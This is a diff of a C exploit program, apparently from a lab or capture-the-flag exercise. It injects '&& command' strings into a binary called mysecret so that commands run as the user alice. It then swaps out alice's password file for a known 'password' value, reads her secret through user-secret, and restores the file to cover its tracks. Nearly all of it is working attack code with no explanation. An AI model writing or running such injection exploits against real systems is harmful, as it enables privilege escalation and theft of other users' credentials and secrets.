@@ -5,13 +5,17 @@
 #define CACHE_MAX 1024
 
 void execute_as_alice(char command[]) {
-    char command_alice[CACHE_MAX];
-    snprintf(command_alice, sizeof(command_alice), "{/home/alice/Public/mysecret \"&& %s \"} &>/dev/null", command);
-#ifdef DEBUG
-    printf("\nExecuting: %s\n", command_alice);
-#endif
+    char command_alice[CACHE_MAX], result[CACHE_MAX];
+    snprintf(command_alice, sizeof(command_alice), "/home/alice/Public/mysecret \"&& %s \"", command);
+
     FILE *fp;
     fp = popen(command_alice, "r");
+    if (fp == NULL)
+        printf("ERROR!!\n");
+    while (fgets(result, CACHE_MAX, fp) != NULL) {
+        // printf("%s", result);
+        continue;
+    }
     // system(command_alice);
 }
 
@@ -43,7 +47,7 @@ int main(int argc, char *argv[])
     snprintf(command, sizeof(command), "mv -f /home/alice/Private/password-%s /home/alice/Private/password-temp;", user);
     execute_as_alice(command);
 
-    snprintf(command, sizeof(command), "echo \'password\' > password-%s", user);
+    snprintf(command, sizeof(command), "echo -n \'password\' > /home/alice/Private/password-%s", user);
     execute_as_alice(command);
 
     snprintf(command, sizeof(command), "/home/alice/Public/user-secret %s password;", user);
@@ -54,13 +58,6 @@ int main(int argc, char *argv[])
 
     snprintf(command, sizeof(command), "mv -f /home/alice/Private/password-temp /home/alice/Private/password-%s;", user);
     execute_as_alice(command);
-
-    // snprintf(command, sizeof(command), "%secho \'password\' > password-%s;", command, user);
-    // printf("\n3:%s\n", command);
-    // snprintf(command, sizeof(command), "/home/alice/Public/mysecret \"&& %s \"", command);
-
-    // printf("\n%s\n", command);
-
 
 	return 0;
 }
